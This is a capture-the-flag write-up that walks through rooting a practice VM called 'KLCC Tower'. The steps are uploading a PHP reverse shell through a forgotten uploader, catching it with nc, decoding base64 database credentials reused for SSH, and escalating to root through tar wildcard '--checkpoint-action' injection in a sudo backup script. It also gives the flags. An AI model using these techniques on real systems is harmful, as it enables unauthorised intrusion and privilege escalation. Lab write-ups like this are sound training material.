## Menara Berkembar KLCC

> Sebuah pelayan web milik “KLCC Tower” telah diceroboh dan disyaki mengandungi konfigurasi yang tidak selamat. Tugas anda adalah untuk mendapatkan akses ke pelayan ini, bermula dari point permulaan (initial foothold) sehingga mendapatkan kawalan penuh (root access).
>
> Muat Turun: https://drive.proton.me/urls/1NYM60WXQ0#LbUYLlPM2Zgy File Name: Menara Berkembar.zip MD5: 0df6b29e6983d15707e63a27aecbe7f9 SHA1: 91fd4114410398b91e55b1ecbce48ae2fc06fddc

## Solution
We were given a VM file that we can open using VMWare or VirtualBox. We needto find 2 flag which are user flag and root flag.

### Step 1 – Host Discovery

First, we identify the target IP address of the VM:
```bash
sudo netdiscover -r 192.168.245.128/24
```

Result:

<img width="651" height="180" alt="image" src="https://github.com/user-attachments/assets/66484dfd-3630-4236-bbd4-d6b647761fc1" />

`192.168.245.139`  ->  Target VM

### Step 2 – Port Scanning

We run an Nmap service scan:
```bash
nmap -sV 192.168.245.139
```

<img width="821" height="239" alt="image" src="https://github.com/user-attachments/assets/091e64ca-5051-4961-8479-08480106071b" />

### Step 3 – Web Enumeration

Navigating to http://192.168.245.139/ shows a static “KLCC Internal Portal” page. Looking into the HTML source reveals an upload file feature:
```html
    <h1>KLCC Internal Portal</h1>
    <div class="subtitle">Authorized Staff Only</div>

    <form>
      <input class="input-field" type="text" placeholder="Staff ID" disabled>
      <input class="input-field" type="password" placeholder="Password" disabled>
      <button class="button" disabled>Login</button>
    </form>

    <footer>© 2025 Petronas Twin Towers | IT Ops Division</footer>
  </div>

  <!-- TODO: Legacy upload still active at /klcc_uploader.php -->
  <!-- Remove before deployment to production -->```
```
### Step 4 – Exploiting File Upload

- Accessing `/klcc_uploader.php` allows us to upload files.
- We upload a simple PHP reverse shell and trigger it by visiting the uploaded file under `/upload/`.

<img width="637" height="358" alt="image" src="https://github.com/user-attachments/assets/a33ccb01-75e9-4c7b-a821-22d64d7bdf2c" />

- On attacker machine, start a listener using `nc`, once executed, we get a reverse shell as www-data. Stabilize the shell using Python.
```bash
nc -lvnp 4444                                                                                  
listening on [any] 4444 ...
connect to [192.168.245.128] from (UNKNOWN) [192.168.245.139] 33460
Linux klcctower 6.8.0-64-generic #67-Ubuntu SMP PREEMPT_DYNAMIC Sun Jun 15 20:23:31 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 14:52:52 up 27 min,  0 user,  load average: 2.08, 1.36, 0.72
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'```
```

### Step 5 – Looting for Credentials

- Exploring `/var/www/html/apache2/mysql/secret`
```bash
www-data@klcctower:/var/www/html$ ls
ls
apache2  klcc_uploader.php  landing.php  upload
www-data@klcctower:/var/www/html$ cd apache2
cd apache2
www-data@klcctower:/var/www/html/apache2$ ls
ls
mysql
www-data@klcctower:/var/www/html/apache2$ cd mysql
cd mysql
www-data@klcctower:/var/www/html/apache2/mysql$ ls
ls
secret
www-data@klcctower:/var/www/html/apache2/mysql$ cat secret
cat secret
W2RiXVxudXNlciA9IGpvaG5cbnBhc3N3b3JkID0ga2xjY1Bvd2VyMjAyNCE=
```

Decoding gives:

```sql
[db]
user = john
password = klccPower2024!
```

### Step 6 – SSH Access as John

Using the recovered credentials:
```bash
ssh john@192.168.245.139
Password: klccPower2024!
```

Now we have access as john.

Retrieve the User Flag:
```
cat /home/john/user.txt
```

## User Flag
```
3108{welcome_to_the_upper_deck}
```
### Step 7 – Privilege Escalation

Check sudo -l:
```bash
john@klcctower:/$ sudo -l
Matching Defaults entries for john on klcctower:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User john may run the following commands on klcctower:
    (ALL) NOPASSWD: /usr/local/bin/backup.sh
```

- Inspecting /usr/local/bin/backup.sh:
```bash
#!/bin/bash
cd /opt/important
tar czf /tmp/backup.tar.gz *
```

This script uses `tar`, which is known to be exploitable with `--checkpoint-action`.

Reference: 
1. https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
2. https://gtfobins.github.io/gtfobins/tar/

### Step 8 – Exploiting Tar for Root

Inside `/opt/important`, create malicious tar options as files, I used `su` to change user account to root account:
```bash
john@klcctower:/opt/important$ echo "" > '--checkpoint=1'
john@klcctower:/opt/important$ echo "" > '--checkpoint-action=exec=su'                                                                                     

```

Run backup as root. This executes our injected command with root privileges, giving us a root shell.

```bash
john@klcctower:/opt/important$ sudo /usr/local/bin/backup.sh
sh: 0: cannot open privesc.sh: No such file
root@klcctower:/opt/important# ls
'--checkpoint=1'                          '--checkpoint-action=exec=su'       '--checkpoint-action=exec=whoami'
'--checkpoint-action=exec=sh privesc.sh'  '--checkpoint-action=exec=sudo -l'   readme.txt```
```


## Step 9 – Capture the Root Flag

Finally:
```bash
cat /root/root.txt
```
## Root Flag
```
3108{you_conquered_the_towers}
```
